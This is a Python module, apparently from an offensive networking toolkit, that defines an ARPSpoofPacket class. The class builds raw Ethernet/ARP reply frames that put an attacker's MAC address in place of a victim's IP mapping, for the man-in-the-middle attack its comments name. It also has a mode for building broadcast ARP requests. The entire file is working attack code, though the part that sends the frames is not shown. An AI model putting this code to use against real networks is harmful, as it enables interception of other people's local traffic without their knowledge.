# -*- coding: utf-8 -*-
#
# ./attack/arpspoof.py
# Eduardo Banderas Alba
# 2022-08
#
# Envenenar tabla arp
#
import fcntl, socket, struct


class ARPSpoofPacket(object):

  _mac_target  = None
  _mac_victim  = None
  _ip_target   = None
  _ip_victim   = None
  _pack_format = '!HHBBH 6s 4s 6s 4s'

  # Ethernet
  __dst       = None   #6 bytes
  __src       = None   #6 bytes
  __ethertype = struct.pack('!H', 0x0806)   #2 bytes

  # ARP
  __htype = struct.pack('!H', 0x01)    #2 bytes  hardware type
  __ptype = struct.pack('!H', 0x0800)  #2 bytes  protocol type
  __hlen  = struct.pack('!B', 0x06)    #1 byte   hardware length
  __plen  = struct.pack('!B', 0x04)    #1 byte   protocol length
  __op    = struct.pack('!H', 0x02)    #2 bytes  op code
  __sha   = None                       #6 bytes  sender hardware address
  __spa   = None                       #4 bytes  sender protocol address
  __tha   = None                       #6 bytes  target hardware address
  __tpa   = None                       #4 bytes  target protocol address

  __mac_attacker = None

  def __init__(self, iface, dst, src, ip_dst, ip_src):
    self.dst = dst      # set tha
    self.src = src      # set sha

    self.tpa = ip_dst
    self.spa = ip_src

    self.mac_attacker = iface
  #__init__

  def payload(self, poison=True):
    # First 14 bytes. dst is mac victim, mac_attacker is local mac for MITM
    if not poison:
      self.op = 0x01
      self.dst = 'ff:ff:ff:ff:ff:ff'
      #self.tpa = '0.0.0.0'

    return self.dst + \
           (self.mac_attacker if poison else self.src) + \
           self.ethertype + \
           self.htype + \
           self.ptype + \
           self.hlen + \
           self.plen + \
           self.op + \
           (self.mac_attacker if poison else self.sha) + \
           self.spa + \
           self.tha + \
           self.tpa
  #payload

  def padding(self):
    return b''

  def ethertype():
    doc = "The ethertype property."
    def fget(self):
      return self.__ethertype

    def fset(self, v):
      self.__ethertype = struct.pack('!H', v)

    def fdel(self):
      del self.__ethertype

    return locals()
  #end definition ethertype property

  def src():
    doc = "The src property."
    def fget(self):
      return self.__src

    def fset(self, v):
      self.__src = bytes.fromhex(''.join([ f'{int(x, 16):02x}' for x in v.split(':') ]))
      self.sha = self.src

    def fdel(self):
      del self.__src

    return locals()
  #end definition src property

  def dst():
    doc = "The dst property."
    def fget(self):
      return self.__dst

    def fset(self, v):
      self.__dst = bytes.fromhex(''.join([ f'{int(x, 16):02x}' for x in v.split(':') ]))
      self.tha = self.dst

    def fdel(self):
      del self.__dst

    return locals()
  #end definition dst property

  def htype():
    doc = "The htype property."
    def fget(self):
      return self.__htype

    def fset(self, v):
      self.__htype = struct.pack('!H', v)

    def fdel(self):
      del self.__htype

    return locals()
  #end definition htype property

  def ptype():
    doc = "The ptype property."
    def fget(self):
      return self.__ptype

    def fset(self, v):
      self.__ptype = struct.pack('!H', v)

    def fdel(self):
      del self.__ptype

    return locals()
  #end definition ptype property

  def hlen():
    doc = "The hlen property."
    def fget(self):
      return self.__hlen

    def fset(self, v):
      self.__hlen = struct.pack('!B', v)

    def fdel(self):
      del self.__hlen

    return locals()
  #end definition hlen property

  def plen():
    doc = "The plen property."
    def fget(self):
      return self.__plen

    def fset(self, v):
      self.__plen = struct.pack('!B', v)

    def fdel(self):
      del self.__plen

    return locals()
  #end definition plen property

  def op():
    doc = "The op property."
    def fget(self):
      return self.__op

    def fset(self, v):
      self.__op = struct.pack('!H', v)

    def fdel(self):
      del self.__op

    return locals()
  #end definition op property

  def sha():
    doc = "The sha property."
    def fget(self):
      return self.__sha

    def fset(self, v):
      self.__sha = v

    def fdel(self):
      del self.__sha

    return locals()
  #end definition sha property

  def spa():
    doc = "The spa property."
    def fget(self):
      return self.__spa

    def fset(self, v):
      self.__spa = bytes.fromhex(''.join([f'{int(a):02x}' for a in v.split('.') ]))

    def fdel(self):
      del self.__spa

    return locals()
  #end definition spa property

  def tha():
    doc = "The tha property."
    def fget(self):
      return self.__tha

    def fset(self, v):
      self.__tha = v

    def fdel(self):
      del self.__tha

    return locals()
  #end definition tha property

  def tpa():
    doc = "The tpa property."
    def fget(self):
      return self.__tpa

    def fset(self, v):
      self.__tpa = bytes.fromhex(''.join([f'{int(a):02x}' for a in v.split('.') ]))

    def fdel(self):
      del self.__tpa

    return locals()
  #end definition tpa property

  def mac_attacker():
    doc = "The mac_attacker property."
    def fget(self):
      return self.__mac_attacker

    def fset(self, v):
      self.__mac_attacker = bytes.fromhex(''.join([ f'{int(x, 16):02x}' for x in v.split(':') ]))

    def fdel(self):
      del self.__mac_attacker

    return locals()
  #end definition mac_attacket property

  src   = property(**src())
  dst   = property(**dst())
  ethertype = property(**ethertype())
  htype = property(**htype())
  ptype = property(**ptype())
  hlen  = property(**hlen())
  plen  = property(**plen())
  op    = property(**op())
  sha   = property(**sha())
  spa   = property(**spa())
  tha   = property(**tha())
  tpa   = property(**tpa())
  mac_attacker = property(**mac_attacker())
#class ARPSpoofPacket
